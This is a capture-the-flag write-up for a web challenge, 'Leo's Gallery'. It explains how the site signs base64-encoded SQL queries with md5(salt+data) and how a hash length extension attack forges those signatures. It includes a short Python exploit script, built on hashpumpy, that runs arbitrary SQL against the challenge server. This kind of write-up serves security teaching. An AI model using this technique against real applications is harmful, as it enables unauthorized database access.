# Writeup

> Name : Leo's Gallery
> 
> Category : web
> 
> Difficulty : easy
> 
> Description : I love this website ! It allows me to store all my wallpapers online, so cool !
>
> URL : `http://<host>:11337/`
> 

## English

We arrive on a wallpaper gallery website. We can observe 2 things :

- An upload part (it's just bait)
- A Gallery tab, that allows us to browse through the different galleries. 

When reviewing the source code, we see the values present in the form : 
```html
<form method="post">
    <select name="images">
        <option value="|8fc8cee62b7d63c442c0d331346c3ec9"></option>
        <option value="U0VMRUNUICogRlJPTSBsYW5kc2NhcGVzV2FsbHBhcGVyczs=|fadf91bd99bf7474edd040d6aaf3ed06">Landscapes</option>
        <option value="U0VMRUNUICogRlJPTSBhbmltYWxzV2FsbHBhcGVyczs=|2703d13c178ef89d4e614490b6b08c92">Animals</option>
        <option value="U0VMRUNUICogRlJPTSBhYnN0cmFjdFdhbGxwYXBlcnM7|59e6374a0cb4ed5401cd73a0e25cd804">Abstract</option>
        <option value="U0VMRUNUICogRlJPTSB1c2VyV2FsbHBhcGVyczs=|b480e2d69cb41122048c3be17a7adee0">Your wallpapers</option>
    </select>
    <input type="submit" value="Show Me !">
</form>
```

Each value looks something like that :
`U0VMRUNUICogRlJPTSBsYW5kc2NhcGVzV2FsbHBhcGVyczs=|fadf91bd99bf7474edd040d6aaf3ed06`

The first part is base64, the other one is md5 salt (which means that it is the md5 of a salt + a string).

The decoded base64 is : `SELECT * FROM landscapesWallpapers;`

It is used to tell the server which gallery to chose.

The md5 is the md5 of a salt concatenated with the base64. 

Hence values have this format : 
`base64(SQLrequest)|md5(salt+base64(SQLrequest))`

The first value only has md5, and no base64. This means that it's value is :`|md5(salt)`

Thus, we have the md5 of the salt alone. This algorithm is vulnerable to an attack called "hash length extension". This means that if we have md5(salt), we can get md5(salt+user_data).

To perform this attack, we can use several tools like HashPump or hash extender. Note that HashPump has a bug that makes it unusable for this challenge. Nevertheless, I forked the project and fixed the bug. It is present on my github if you wanna use this version, otherwise just use hash extender.

All that's needed is to tell the tool the length of the secret (aka the salt), which the player doesn't know. It just needs a bit of bruteforce to get the right one, as long as you have a valid SQL request (`SELECT 1;` is enough).

After a bit of bruteforce you get that the length is 26 and can then proceed with the challenge.

Here is a python code to execute any mysql request through this attack :
```python
import requests
import hashpumpy
import warnings
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
url = "http://localhost:113377/gallery.php"
b64_req = base64.b64encode(b"select 1;")

hash,payload = hashpumpy.hashpump("8fc8cee62b7d63c442c0d331346c3ec9",'',b64_req,26)
r = requests.post(url,data={"images":payload+b"|"+hash.encode()})
print(r.text)
```